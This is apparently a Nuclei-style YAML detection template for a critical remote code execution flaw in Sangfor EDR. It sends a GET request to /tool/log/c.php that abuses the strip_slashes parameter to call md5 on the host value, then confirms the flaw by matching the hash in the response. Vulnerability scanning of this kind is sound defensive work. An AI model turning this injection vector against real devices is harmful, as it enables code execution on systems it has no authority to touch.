id: poc-yaml-sangfor-edr-rce
info:
  name: Sangfor EDR Remote Code Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
http:
  - method: GET
    path:
      - "{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host=2222"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "934b535800b1cba8f96a5d72f72f1611"
